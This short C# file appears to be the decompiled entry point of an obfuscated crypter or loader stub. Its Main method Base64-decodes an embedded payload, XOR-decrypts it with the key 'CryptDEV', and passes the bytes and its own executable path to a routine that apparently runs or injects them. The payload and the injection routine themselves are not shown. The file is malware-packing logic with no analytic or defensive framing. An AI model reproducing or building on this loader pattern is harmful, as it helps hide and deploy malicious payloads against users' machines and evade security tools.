using System;
using System.Diagnostics;

namespace ns0;

internal static class Class4
{
	[STAThread]
	private static void Main()
	{
		Class7.smethod_1();
		byte[] bytes = GClass0.XorDecrypt(Convert.FromBase64String(Class5.String1), "CryptDEV");
		string fileName = Process.GetCurrentProcess().MainModule!.FileName;
		GClass1.smethod_1(bytes, fileName);
	}
}
